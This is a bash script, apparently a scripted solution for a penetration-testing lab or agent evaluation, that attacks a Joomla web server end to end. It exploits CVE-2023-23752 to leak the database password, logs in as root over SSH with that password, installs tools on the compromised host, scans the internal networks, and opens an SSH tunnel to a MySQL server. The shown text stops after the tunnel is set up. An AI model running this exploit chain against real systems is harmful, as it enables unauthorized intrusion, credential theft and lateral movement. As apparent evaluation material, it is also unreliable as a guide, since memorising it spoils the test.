# === PHASE 1: RECONNAISSANCE ===
# Get public network (that the agent is on)
PUBLIC_NET=$(ip -o -f inet addr show eth0 | awk '{print $4}')
echo "Public network: $PUBLIC_NET"

# Get IP of the web service
WEB_IP=$(nmap -p 80 $PUBLIC_NET | grep -B 4 "80/tcp open" | grep "Nmap scan report" | awk '{print $6}' | tr -d '()')
echo "Web IP: $WEB_IP"

# Enumerate Joomla! version
JOOMLA_VERSION=$(curl -s http://$WEB_IP/administrator/manifests/files/joomla.xml | grep -o '<version>[0-9]*\.[0-9]*' | cut -d'>' -f2)
echo "Joomla! Version: $JOOMLA_VERSION"

# # Find Joomla! CVE
# searchsploit joomla | grep $JOOMLA_VERSION

# Use CVE-2023-23752 to get password for connecting to MySQL database
PASSWORD=$(curl -s "http://$WEB_IP/api/index.php/v1/config/application?public=true" | grep -o '"password":"[^"]*"' | sed 's/"password":"//g' | sed 's/"//g')
echo "Password: $PASSWORD"

# === PHASE 2: INITAL PRIMARY INTERNAL NETWORK ACCESS ===
# Install iproute2 on web service (if not already installed)
sshpass -p "$PASSWORD" ssh -q -o StrictHostKeyChecking=no root@$WEB_IP "{ which ip || (apt-get update && apt-get install -y iproute2); } >/dev/null 2>&1" >/dev/null 2>&1

# SSH into web service (using same password as for MySQL) and find networks connected to it
WEBAPP_NETWORK_ETH0=$(sshpass -p "$PASSWORD" ssh -o StrictHostKeyChecking=no root@$WEB_IP "ip addr show eth0 | grep 'inet ' | awk '{print \$2}'")
WEBAPP_NETWORK_ETH1=$(sshpass -p "$PASSWORD" ssh -o StrictHostKeyChecking=no root@$WEB_IP "ip addr show eth1 | grep 'inet ' | awk '{print \$2}'")

# Run nmap from web service to scan the networks connected to it
WEB_NMAP=$(sshpass -p "$PASSWORD" ssh -o StrictHostKeyChecking=no root@$WEB_IP "which nmap >/dev/null 2>&1 || (apt-get update && apt-get install -y nmap >/dev/null 2>&1); nmap -sn $WEBAPP_NETWORK_ETH0 $WEBAPP_NETWORK_ETH1")

# Save MySQL server and workstation IP addresses
MYSQL_IP=$(echo "$WEB_NMAP" | grep -B1 "mysql" | grep "Nmap scan report" | grep -oE '([0-9]{1,3}\.){3}[0-9]{1,3}')
WORKSTATION_IP=$(echo "$WEB_NMAP" | grep -B1 "workstation" | grep "Nmap scan report" | grep -oE '([0-9]{1,3}\.){3}[0-9]{1,3}')
echo "MySQL IP: $MYSQL_IP"
echo "Workstation IP: $WORKSTATION_IP"

# === PHASE 3: MYSQL ACCESS THROUGH PORT FORWARDING ===
# Set up port forwarding to MySQL server through web service
sshpass -p "$PASSWORD" ssh -L 3306:$MYSQL_IP:3306 -N -f -o StrictHostKeyChecking=no root@$WEB_IP

# Give the tunnel a moment to establish
sleep 2
